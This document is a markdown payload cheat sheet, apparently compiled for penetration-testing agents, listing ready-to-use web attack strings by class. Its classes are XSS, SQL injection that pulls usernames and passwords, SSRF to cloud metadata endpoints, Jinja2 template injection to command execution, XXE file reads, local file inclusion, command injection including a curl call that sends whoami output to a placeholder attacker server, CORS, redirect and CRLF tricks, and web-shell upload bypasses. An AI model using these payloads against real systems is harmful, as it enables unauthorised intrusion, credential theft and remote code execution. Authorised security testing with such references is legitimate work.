# Master Payload Library

> Consolidated from PayloadsAllTheThings, SecLists, awesome-skills-security, pentest-agents payload rules.

## XSS Payloads
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)
"><img src=x onerror=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">
'-alert(1)-'
\';alert(1)//
" onfocus=alert(1) autofocus="
" onmouseover=alert(1) "
"><svg/onload=alert(1)>
<svg/onload=alert(1)>
"><svg><script>alert(1)</script>
```

## SQL Injection Payloads
```
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
" OR "1"="1
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
1' UNION SELECT username,password FROM users--
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
'; WAITFOR DELAY '0:0:5'--
' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--
' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--
' ORDER BY 10--
```

## SSRF Payloads
```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://127.0.0.1:8080
http://127.0.0.1:6379
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
```

## SSTI Payloads
```
{{7*7}}  → 49
${7*7}   → 49
<%= 7*7 %>  → 49
{{config}}  → full config dump
{{''.__class__.__mro__[2].__subclasses__()}}  → class list
{{lipsum.__globals__['os'].popen('id').read()}}  → RCE (Jinja2)
```

## XXE Payloads
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- Blind XXE -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR_SERVER/xxe.dtd">%xxe;]>
```

## LFI Payloads
```
../../../../../../etc/passwd
../../../../../../windows/system32/drivers/etc/hosts
php://filter/convert.base64-encode/resource=index.php
php://input
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
expect://id
```

## Command Injection Payloads
```
; id
| id
|| id
& id
$(id)
`id`
; cat /etc/passwd
; sleep 5
; curl http://YOUR_SERVER/$(whoami)
; nslookup YOUR_SERVER
```

## CORS Payloads
```
Origin: https://evil.com
Origin: null
Origin: https://evil.target.com
Origin: https://target.com.attacker.com
Origin: https://target.com@evil.com
```

## Open Redirect Payloads
```
https://evil.com
//evil.com
/\/evil.com
https://evil.com%2F.target.com
https://evil.com@.target.com
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

## JWT Attack Payloads
```
# alg:none
header.payload.

# Weak secret wordlist candidates
secret, password, 123456, admin, jwt, key, token, your-256-bit-secret, supersecret
```

## NoSQL Injection Payloads
```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$regex": ".*admin.*"}, "password": {"$ne": ""}}
{"$where": "this.username == 'admin'"}
username[$ne]=&password[$ne]=
```

## Prototype Pollution
```
__proto__[admin]=true
__proto__[role]=admin
constructor[prototype][isAdmin]=true
```

## Header Injection
```
X-Forwarded-For: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-HTTP-Method-Override: DELETE
X-Custom-IP-Authorization: 127.0.0.1
```

## CRLF Injection
```
%0d%0aSet-Cookie:crlf=injection
%0d%0a%0d%0a<script>alert(1)</script>
%0D%0ALocation:%20http://evil.com
```

## File Upload Bypass
```
shell.php.jpg
shell.php%00.jpg
shell.php\x00.jpg
shell.pHp
shell.php7
shell.phtml
shell.php5
shell.pht
shell.phar
shell.shtml
.php.jpg  (double extension)
```
